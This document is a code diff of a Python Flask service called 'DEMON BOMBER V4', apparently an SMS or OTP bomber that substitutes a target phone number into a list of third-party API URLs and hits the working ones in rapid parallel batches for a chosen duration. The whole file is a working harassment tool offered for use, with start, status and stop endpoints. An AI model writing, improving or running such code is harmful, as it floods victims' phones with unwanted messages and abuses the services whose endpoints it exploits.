@@ -5,7 +5,7 @@ import threading
 import time
 import os
 import json
-from datetime import datetime, timedelta
+from datetime import datetime
 
 app = Flask(__name__)
 
@@ -17,35 +17,34 @@ attack_status = {
     'total_hits': 0,
     'real_hits': 0,
     'apis_loaded': 0,
-    'dead_apis': 0,
     'working_apis': 0,
+    'dead_apis': 0,
     'start_time': None
 }
 
-# Store dead APIs to skip
 dead_apis = set()
-working_apis = []
+working_apis_cache = []
 api_lock = threading.Lock()
+is_filtered = False
 
-# Load APIs with caching
 def load_apis():
-    global working_apis
     apis = []
     filename = 'bomber_apis.txt'
     try:
         with open(filename, 'r', encoding='utf-8') as f:
             for line in f:
                 url = line.strip()
-                if url.startswith('http'):
-                    url = url.split(' ')[0].split('\n')[0]
-                    if url and url.startswith('http'):
+                if url and url.startswith('http'):
+                    # Clean URL
+                    url = url.split(' ')[0].split('\n')[0].split('`')[0].split('"')[0]
+                    if url and url.startswith('http') and len(url) > 10:
                         apis.append(url)
-    except:
-        pass
+    except Exception as e:
+        print(f"Error loading APIs: {e}")
     return apis
 
-# Test single API
-async def test_api(session, url, target):
+async def test_api_quick(session, url, target):
+    """Quick test - just check if API responds"""
     try:
         formatted = (url.replace('{target}', target)
                        .replace('{num}', target)
@@ -53,63 +52,20 @@ async def test_api(session, url, target):
                        .replace('{no}', target))
         
         headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': '*/*',
+            'Connection': 'keep-alive'
         }
         
-        async with session.get(formatted, headers=headers, timeout=3) as response:
-            if response.status in [200, 201, 202, 204]:
+        async with session.get(formatted, headers=headers, timeout=2) as response:
+            if response.status in [200, 201, 202, 204, 302, 301, 303, 307]:
                 return url, True
     except:
         pass
     return url, False
 
-# Filter dead APIs (runs once at start)
-async def filter_dead_apis(target):
-    global working_apis, dead_apis
-    all_apis = load_apis()
-    
-    if not all_apis:
-        return []
-    
-    print(f"[+] Testing {len(all_apis)} APIs for dead ones...")
-    
-    working = []
-    dead = []
-    
-    async with aiohttp.ClientSession() as session:
-        # Test in batches of 50
-        for i in range(0, len(all_apis), 50):
-            batch = all_apis[i:i+50]
-            tasks = [test_api(session, url, target) for url in batch]
-            results = await asyncio.gather(*tasks)
-            
-            for url, is_working in results:
-                if is_working:
-                    working.append(url)
-                else:
-                    dead.append(url)
-            
-            print(f"[+] Progress: {len(working)} working, {len(dead)} dead out of {i+len(batch)}")
-            await asyncio.sleep(0.5)  # Don't hammer
-    
-    with api_lock:
-        working_apis = working
-        dead_apis = set(dead)
-    
-    attack_status['working_apis'] = len(working)
-    attack_status['dead_apis'] = len(dead)
-    
-    print(f"[+] Filter complete: {len(working)} working APIs found")
-    
-    # Save working APIs for future
-    with open('working_apis.txt', 'w') as f:
-        f.write('\n'.join(working))
-    
-    return working
-
-# Main attack function with auto-filter
-async def attack_loop(target, duration):
-    global working_apis, dead_apis
+async def filter_and_attack(target, duration):
+    global working_apis_cache, dead_apis, attack_status, is_filtered
     
     attack_status['running'] = True
     attack_status['target'] = target
@@ -122,71 +78,81 @@ async def attack_loop(target, duration):
     all_apis = load_apis()
     if not all_apis:
         attack_status['running'] = False
-        return
+        return {"error": "No APIs found"}
     
     attack_status['apis_loaded'] = len(all_apis)
     
-    # Filter dead APIs if not done yet
-    if not working_apis and not dead_apis:
-        print("[+] First run: Filtering dead APIs...")
-        await filter_dead_apis(target)
-    
-    # Use working APIs
-    apis_to_use = working_apis if working_apis else all_apis
-    
-    if not apis_to_use:
-        attack_status['running'] = False
-        return
-    
-    print(f"[+] Using {len(apis_to_use)} working APIs")
-    
-    end_time = time.time() + duration
+    # FILTER AND ATTACK IN ONE GO - MILLISECONDS MEIN
+    working = []
+    dead = []
     success_count = 0
-    real_count = 0
-    api_index = 0
     
     async with aiohttp.ClientSession() as session:
+        # Test all APIs quickly in parallel
+        print(f"[+] Testing {len(all_apis)} APIs in milliseconds...")
+        
+        # Send all requests at once (parallel)
+        tasks = [test_api_quick(session, url, target) for url in all_apis]
+        results = await asyncio.gather(*tasks)
+        
+        # Process results
+        for url, is_working in results:
+            if is_working:
+                working.append(url)
+            else:
+                dead.append(url)
+        
+        print(f"[+] Found {len(working)} working APIs in {len(all_apis)} total")
+        
+        # Save working APIs
+        with api_lock:
+            working_apis_cache = working
+            dead_apis = set(dead)
+            is_filtered = True
+        
+        attack_status['working_apis'] = len(working)
+        attack_status['dead_apis'] = len(dead)
+        
+        # If no working APIs, stop
+        if not working:
+            attack_status['running'] = False
+            return {"error": "No working APIs found"}
+        
+        # START ATTACK WITH WORKING APIS
+        print(f"[+] Starting attack with {len(working)} working APIs...")
+        end_time = time.time() + duration
+        api_index = 0
+        
         while time.time() < end_time and attack_status['running']:
-            # Take 50 APIs per cycle
-            batch_size = min(50, len(apis_to_use))
-            batch = apis_to_use[api_index:api_index + batch_size]
-            
+            # Take 50 working APIs per cycle
+            batch = working[api_index:api_index + 50]
             if not batch:
                 api_index = 0
                 continue
             
-            tasks = [hit_api(session, url, target) for url in batch]
-            results = await asyncio.gather(*tasks)
+            # Send requests in parallel
+            hit_tasks = [send_request(session, url, target) for url in batch]
+            hit_results = await asyncio.gather(*hit_tasks)
             
-            # Process results and update dead list
-            for i, (url, success) in enumerate(results):
+            # Count successes
+            for success in hit_results:
                 if success:
                     success_count += 1
-                    real_count += 1
-                else:
-                    # If API fails, mark as dead
-                    if url not in dead_apis:
-                        with api_lock:
-                            dead_apis.add(url)
-                            if url in working_apis:
-                                working_apis.remove(url)
             
             attack_status['total_hits'] = success_count
-            attack_status['real_hits'] = real_count
-            attack_status['working_apis'] = len(working_apis)
-            attack_status['dead_apis'] = len(dead_apis)
+            attack_status['real_hits'] = success_count
             
-            # Update working APIs list dynamically
-            api_index += batch_size
-            if api_index >= len(apis_to_use):
+            api_index += 50
+            if api_index >= len(working):
                 api_index = 0
-                print(f"[+] Cycle complete - Hits: {success_count}, Working: {len(working_apis)}")
             
-            await asyncio.sleep(0.3)
+            await asyncio.sleep(0.1)  # Small delay
     
     attack_status['running'] = False
+    return {"success": True, "hits": success_count}
 
-async def hit_api(session, url, target):
+async def send_request(session, url, target):
+    """Send actual attack request"""
     try:
         formatted = (url.replace('{target}', target)
                        .replace('{num}', target)
@@ -197,27 +163,22 @@ async def hit_api(session, url, target):
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
         }
         
-        async with session.get(formatted, headers=headers, timeout=3) as response:
-            if response.status in [200, 201, 202, 204, 302, 301]:
-                return url, True
+        async with session.get(formatted, headers=headers, timeout=2) as response:
+            return response.status in [200, 201, 202, 204, 302, 301]
     except:
-        pass
-    return url, False
+        return False
 
-# -------- FLASK API ENDPOINTS --------
-
-app = Flask(__name__)
+# -------- FLASK API --------
 
 @app.route('/')
 def home():
     return '''
-    <h1>🔥 DEMON BOMBER V3 - AUTO FILTER 🔥</h1>
-    <p>Endpoints:</p>
+    <h1>🔥 DEMON BOMBER V4 - ULTRA FAST FILTER 🔥</h1>
+    <p>Auto-filter in milliseconds!</p>
     <ul>
-        <li><b>GET /start?target=9876543210&duration=60</b> - Start attack (auto-filters dead APIs)</li>
-        <li><b>GET /status</b> - Check status with dead/working stats</li>
-        <li><b>GET /filter?target=9876543210</b> - Manually filter dead APIs</li>
-        <li><b>GET /stats</b> - API statistics</li>
+        <li><b>GET /start?target=9876543210&duration=60</b> - Test & attack</li>
+        <li><b>GET /status</b> - Check status</li>
+        <li><b>GET /stop</b> - Stop attack</li>
     </ul>
     '''
 
@@ -230,19 +191,19 @@ def start_attack():
         return jsonify({'error': 'Missing target!'}), 400
     
     if attack_status['running']:
-        return jsonify({'error': 'Attack already running! Use /stop'}), 400
+        return jsonify({'error': 'Attack already running!'}), 400
     
-    # Start attack in background
+    # Start in background
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
-    thread = threading.Thread(target=lambda: loop.run_until_complete(attack_loop(target, duration)))
+    thread = threading.Thread(target=lambda: loop.run_until_complete(filter_and_attack(target, duration)))
     thread.start()
     
     return jsonify({
         'success': True,
         'target': target,
         'duration': duration,
-        'message': 'Attack started with auto-filter'
+        'message': 'Testing APIs & attacking simultaneously!'
     })
 
 @app.route('/status')
@@ -255,37 +216,7 @@ def get_status():
         'real_hits': attack_status['real_hits'],
         'apis_loaded': attack_status['apis_loaded'],
         'working_apis': attack_status['working_apis'],
-        'dead_apis': attack_status['dead_apis'],
-        'start_time': attack_status['start_time']
-    })
-
-@app.route('/filter')
-def filter_apis():
-    target = request.args.get('target', '9876543210')
-    
-    if attack_status['running']:
-        return jsonify({'error': 'Attack is running! Stop first.'}), 400
-    
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    result = loop.run_until_complete(filter_dead_apis(target))
-    
-    return jsonify({
-        'success': True,
-        'total_tested': attack_status['apis_loaded'],
-        'working': attack_status['working_apis'],
-        'dead': attack_status['dead_apis'],
-        'working_list': result[:20]  # Show first 20
-    })
-
-@app.route('/stats')
-def get_stats():
-    all_apis = load_apis()
-    return jsonify({
-        'total_apis': len(all_apis),
-        'working': attack_status['working_apis'],
-        'dead': attack_status['dead_apis'],
-        'efficiency': f"{(attack_status['working_apis'] / len(all_apis) * 100) if all_apis else 0:.1f}%"
+        'dead_apis': attack_status['dead_apis']
     })
 
 @app.route('/stop')
@@ -293,12 +224,12 @@ def stop_attack():
     global attack_status
     if attack_status['running']:
         attack_status['running'] = False
-        return jsonify({'success': True, 'message': 'Attack stopped!'})
-    return jsonify({'success': False, 'message': 'No attack running.'})
+        return jsonify({'success': True, 'message': 'Stopped!'})
+    return jsonify({'success': False, 'message': 'Not running.'})
 
 @app.route('/health')
 def health():
-    return jsonify({'status': 'alive', 'working_apis': attack_status['working_apis']})
+    return jsonify({'status': 'alive', 'working': attack_status['working_apis']})
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
